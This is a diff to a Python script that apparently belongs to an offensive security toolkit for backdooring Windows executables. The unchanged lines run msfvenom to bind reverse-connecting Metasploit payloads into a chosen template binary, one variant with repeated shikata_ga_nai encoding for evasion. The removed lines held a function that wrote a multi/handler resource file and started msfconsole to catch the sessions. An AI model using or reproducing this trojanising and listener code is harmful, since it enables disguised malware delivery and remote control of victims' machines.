@@ -10,36 +10,14 @@ import subprocess
 import re
 import time
 import urllib
-from src import menus
-from src.main import *
+from src.core import menus
+from src.core.main import *
 
 # grab interface ip
 iface = iface_ip()
 
 # grab the metasploit path
 msf_path = msfpath()
-
-def start_listener():
-	PrintInfo("Starting multi handler")
-
-	# create rc file
-	rcfile = "output/bd_listener.rc"
-	fw = open(rcfile, "w")
-	fw.write("use exploit/multi/handler\n")
-	fw.write("set PAYLOAD %s\n" % payload)
-	fw.write("set LHOST 0.0.0.0\n")
-	fw.write("set LPORT %s\n" % port)
-	fw.write("set ExitOnSession false\n")
-	fw.write("set AutoRunScript migrate -f\n")
-	fw.write("exploit -j -z")
-	fw.close()
-
-	# start listener
-	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
-
-	PrintInfo("Cleaning up...")
-	os.remove(rcfile)
-	time.sleep(1)
 
 while 1:
 	try:
@@ -79,10 +57,6 @@ while 1:
 			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
 			PrintInfo("Payload output/%s created" % outfile)
 			
-			listener = raw_input("\nStart MSF listener (Y/N):")
-			if listener == 'Y' or listener == '':
-				start_listener()
-			
 		elif bdtype == '2' or bdtype == '':
 						
 			# create payload bat file in /tmp
@@ -102,10 +76,6 @@ while 1:
 			PrintInfo("Binding payload to executeable")
 			subprocess.Popen("cat %s | %s/msfvenom -a x86 --platform windows -x %s -f exe -k > output/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
 			PrintInfo("Payload output/%s created" % outfile)
-			
-			listener = raw_input("\nStart MSF listener (Y/N):")
-			if listener == 'Y' or listener == '':
-				start_listener()
 			
 			# clean up
 			os.remove(x86file)
